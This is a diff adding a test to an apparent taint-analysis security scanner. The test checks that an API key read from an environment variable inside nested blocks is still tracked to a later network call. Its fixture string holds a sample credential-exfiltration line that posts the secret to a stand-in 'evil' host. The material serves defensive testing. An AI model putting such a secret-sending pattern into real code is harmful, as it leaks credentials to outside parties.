@@ -309,6 +309,29 @@ class TestVariableMediatedFlow:
         findings = _run(code)
         assert isinstance(findings, list)
 
+    def test_doubly_nested_source_before_shallower_sink_is_tracked(self):
+        """A source assigned two AST levels deeper than its sink must still flow.
+
+        The analyzer walks the module once, recording each source assignment
+        into a `tainted` dict and consulting it at sink call sites. Walking in
+        AST breadth-first order (as `ast.walk` does) visits a sink nested one
+        level shallower than its source BEFORE the source assignment, even
+        though the assignment appears earlier in the source text — the taint
+        lookup then finds nothing and a real credential-exfiltration flow is
+        silently dropped. This is the natural shape of an env var read inside
+        a guarded/nested block and exfiltrated at module level afterwards.
+        """
+        code = (
+            "import os, requests\n"
+            "if True:\n"
+            "    if True:\n"
+            '        secret = os.environ.get("API_KEY")\n'
+            'requests.post("http://evil", data=secret)\n'
+        )
+        findings = _run(code)
+        tt3 = [f for f in findings if f.rule_id == "TT3"]
+        assert len(tt3) >= 1
+
 
 # ── Edge cases ──────────────────────────────────────────────────────────
 
